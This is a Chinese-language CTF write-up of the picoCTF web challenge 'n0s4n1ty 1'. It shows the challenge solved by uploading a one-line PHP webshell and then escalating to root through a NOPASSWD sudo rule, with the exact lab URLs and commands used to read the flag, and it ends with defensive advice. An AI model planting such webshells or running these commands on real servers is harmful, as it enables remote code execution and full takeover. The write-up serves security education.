---
title: n0s4n1ty 1 writeup
description: ctf题解1--web
type: knowledge
pubDate: Oct 01 2026
updatedDate: Oct 01 2026
---


## 核心漏洞：任意文件上传（Unrestricted File Upload）



正常的头像上传功能，服务器应该做这些检查：

\- 只允许图片扩展名（.jpg、.png）

\- 验证文件真实类型（看文件头的 magic bytes，不是只看扩展名）

\- 把上传目录设成"不可执行"，或者把文件重命名、去掉扩展名



这题（n0s4n1ty = no sanity，没有任何校验）全都没做。所以你能传一个 .php 文件上去，这就埋下了整个攻击的种子。



为什么一定要把上传的文件变成php形式呢：关键在于服务器是用 PHP 跑的，而且上传目录 /uploads/ 在 Web 根目录下是执行 PHP。当你访问 uploads/shell.php 时，服务器不会把它当普通文件返回给你，而是交给 PHP 解释器去执行。你的文件内容是：

<?php system($_GET\["cmd"]); ?>

\- $_GET\["cmd"] 取 URL 里 ?cmd= 后面的值。

\- system() 把这个值当系统命令在服务器上执行。

所以 ?cmd=id 实际上是让服务器执行了 id 这条 Linux 命令，再把结果回显给你。这就是 RCE（远程代码执行）——你能在别人的服务器上跑任意命令了。这也是文件上传漏洞最严重的后果。

注意在解题过程中文件格式问题：你一开始用 WPS/Word 做的文件，表面是 .php，里面却是 Word 的二进制。PHP 解释器只认 <?php ?> 标签内的代码，标签外的一堆二进制会被原样吐出来，所以你看到满屏乱码。教训：webshell 必须是纯文本。



sudo -l 是提权第一步——查当前

(ALL) NOPASSWD: ALL

意思是 www-data 可以不用密码、以 root 身份运行任何命令。这是一个严重的错误配置（现实中绝不该给 Web 用户这种权限）。于是命令前加 sudo，你就从 www-data 变成了 root，自然能读 /root/flag.txt。



## **完整攻击链总结**

一、本地准备：做 webshell 文件



用记事本（不能用 WPS/Word）新建文件，内容就一行：



<?php system($_GET\["cmd"]); ?>



另存为，保存类型选"所有文件"，文件名 shell.php。



二、上传



在网站首页点"选择文件"选 shell.php，点 Upload Profile。

页面返回：Path: uploads/shell.php —— 记下这个路径。



（下面链接里的 主机:端口 用你当前实例的，端口会变，比如现在是 35155。%20 是空格的意思。）



三、浏览器里依次访问的链接（4 条命令）



1. 确认能执行命令、看自己是谁

http://xebec.cylabacademy.net:35155/uploads/shell.php?cmd=id

→ 得到 uid=33(www-data)...，说明是低权限用户。



2. 查有没有 sudo 提权的机会

http://xebec.cylabacademy.net:35155/uploads/shell.php?cmd=sudo%20-l

→ 看到 (ALL) NOPASSWD: ALL，说明能免密码提权到 root。



3. 用 sudo 列出 /root 里有什么文件

http://xebec.cylabacademy.net:35155/uploads/shell.php?cmd=sudo%20ls%20-la%20/root

→ 看清 flag 文件的真实名字（通常是 flag.txt）。



4. 用 sudo 读出 flag

http://xebec.cylabacademy.net:35155/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt

→ 页面显示 picoCTF{...}，这就是答案。



对应的"真实命令"是什么



把上面 URL 里的 cmd= 和 %20 翻译回来，你实际在服务器上执行的就是这 4 条 Linux 命令：



id                      # 我是谁

sudo -l                 # 我能用 sudo 做什么

sudo ls -la /root       # /root 里有哪些文件

sudo cat /root/flag.txt # 读出 flag



### 所以现实生活中一定要注意防御：

\- 上传只允许白名单扩展名，并校验文件真实内容（magic bytes）。

\- 上传目录禁止执行脚本（服务器配置里关掉该目录的 PHP 解析）。

\- 存储时重命名文件、随机化路径。

\- 最小权限原则：Web 进程用户绝不给 NOPASSWD: ALL 这种 sudo 权限。
